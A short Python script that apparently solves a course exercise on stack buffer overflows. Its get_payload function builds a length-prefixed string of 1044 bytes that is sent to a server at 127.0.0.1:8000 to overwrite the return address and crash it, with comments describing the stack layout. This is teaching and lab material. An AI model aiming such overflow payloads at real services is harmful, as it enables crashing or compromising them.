import os
import socket
import struct

HOST = '127.0.0.1'
PORT = 8000


def get_payload() -> bytes:
    """
    This function returns the data to send over the socket to the server.

    This data should cause the server to crash and generate a core dump. Make
    sure to return a `bytes` object and not an `str` object.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    # size of the buffer is 1024 and above it on stack there is 4 bytes of
    # int32_t variable and the 4 bytes of the bp and the 4 bytes of the
    # return address so 1040 bytes to override on the stack
    # are more than enough for the program to jump for an invalid address
    # and give us the segmentation fault that we want
 
    return get_wrapper_payload_with_length("D" * 1040 + "A" * 4)


def network_order_uint32(value) -> bytes:
    return struct.pack('>L', value)

def get_wrapper_payload_with_length(message: str) -> bytes:
    if message[-1] != '\0':
        message = message + '\0'
    # Convert from string to bytes
    message = message.encode('latin1')
    return network_order_uint32(len(message)) + message


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
